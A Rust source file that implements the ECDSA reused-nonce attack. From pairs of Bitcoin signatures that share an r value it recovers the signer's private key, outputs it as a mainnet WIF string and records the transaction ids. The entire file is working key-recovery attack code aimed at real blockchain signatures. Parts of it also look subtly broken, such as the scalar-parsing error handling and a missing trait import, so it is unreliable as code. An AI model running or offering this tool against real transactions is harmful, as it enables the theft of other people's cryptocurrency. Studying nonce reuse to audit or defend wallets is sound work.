use anyhow::{anyhow, Result};
use k256::{
    ecdsa::Signature as K256Signature,
    Scalar,
};
use num_bigint::BigUint;
use num_traits::{Zero, ToPrimitive};
use std::collections::HashMap;
use std::str::FromStr;
use sha2::{Sha256, Digest};
use crate::types::{SignatureRow, RecoveredKeyRow};

/// Attempts to recover the private key using the ECDSA reused-k attack
/// This attack works when the same k value is used in two different signatures
pub fn attempt_recover_k_and_priv(
    sig1: &SignatureRow,
    sig2: &SignatureRow,
) -> Result<Option<RecoveredKeyRow>> {
    // Parse R, S, and Z values from hex strings
    let r1 = parse_hex_to_scalar(&sig1.r)?;
    let s1 = parse_hex_to_scalar(&sig1.s)?;
    let z1 = parse_hex_to_scalar(&sig1.z)?;
    
    let r2 = parse_hex_to_scalar(&sig2.r)?;
    let s2 = parse_hex_to_scalar(&sig2.s)?;
    let z2 = parse_hex_to_scalar(&sig2.z)?;

    // Check if R values are the same (same k value used)
    if r1 != r2 {
        return Ok(None);
    }

    // Check if Z values are different (different messages)
    if z1 == z2 {
        return Ok(None);
    }

    // Calculate the difference in Z values using modular arithmetic
    // Note: We can't directly compare Scalars, so we'll use subtraction and handle the result
    // Instead of direct comparison, subtract and check if result is zero
    let z_diff = z1 - z2;
    
    // Calculate the difference in S values using modular arithmetic
    // If the result would be negative in normal arithmetic, 
    // the modular subtraction automatically handles it correctly
    // No need for manual comparison
    let s_diff = s1 - s2;

    // Calculate the inverse of the S difference - handle CtOption properly
    let s_diff_inv = s_diff.invert();
    if s_diff_inv.is_none().into() {
        return Ok(None); // No inverse exists
    }
    let s_diff_inv = s_diff_inv.unwrap();

    // Calculate the inverse of R1
    let r_inv = r1.invert();
    if r_inv.is_none().into() {
        return Ok(None); // No inverse exists
    }
    let r_inv = r_inv.unwrap();

    // Calculate k = (z1 - z2) * (s1 - s2)^(-1) mod n
    let k = z_diff * s_diff_inv;

    // Calculate the private key: priv = (s1 * k - z1) * r^(-1) mod n
    let priv_key = (s1 * k - z1) * r_inv;

    // Convert private key to WIF format
    let private_key_wif = scalar_to_wif(&priv_key)?;

    Ok(Some(RecoveredKeyRow {
        txid1: sig1.txid.clone(),
        txid2: sig2.txid.clone(),
        r: sig1.r.clone(),
        private_key: private_key_wif,
    }))
}

fn parse_hex_to_scalar(hex_str: &str) -> Result<Scalar> {
    let bytes = hex::decode(hex_str)?;
    if bytes.len() != 32 {
        return Err(anyhow!("Expected 32 bytes for scalar, got {}", bytes.len()));
    }
    
    let mut buf = [0u8; 32];
    buf.copy_from_slice(&bytes);
    
    Scalar::from_repr(buf.into())
        .or_else(|| anyhow!("Invalid scalar value"))
}

fn scalar_to_wif(scalar: &Scalar) -> Result<String> {
    // Convert scalar to bytes
    let bytes = scalar.to_bytes();
    
    // Add version byte (0x80 for mainnet private key)
    let mut wif_bytes = vec![0x80];
    wif_bytes.extend_from_slice(&bytes);
    
    // Add compression flag (0x01 for compressed public keys)
    wif_bytes.push(0x01);
    
    // Double SHA256 hash
    let hash1 = Sha256::digest(&wif_bytes);
    let hash2 = Sha256::digest(&hash1);
    
    // Add first 4 bytes of double hash as checksum
    wif_bytes.extend_from_slice(&hash2[..4]);
    
    // Base58 encode
    Ok(base58_encode(&wif_bytes))
}

fn base58_encode(bytes: &[u8]) -> String {
    let alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
    let base = 58u32;
    
    let mut num = BigUint::from_bytes_be(bytes);
    let mut result = String::new();
    
    while num > BigUint::zero() {
        let (quotient, remainder) = num.div_rem(&base.to_biguint().unwrap());
        result.push(alphabet.chars().nth(remainder.to_u32().unwrap() as usize).unwrap());
        num = quotient;
    }
    
    // Add leading '1's for each leading zero byte
    for &byte in bytes {
        if byte == 0 {
            result.push('1');
        } else {
            break;
        }
    }
    
    result.chars().rev().collect()
}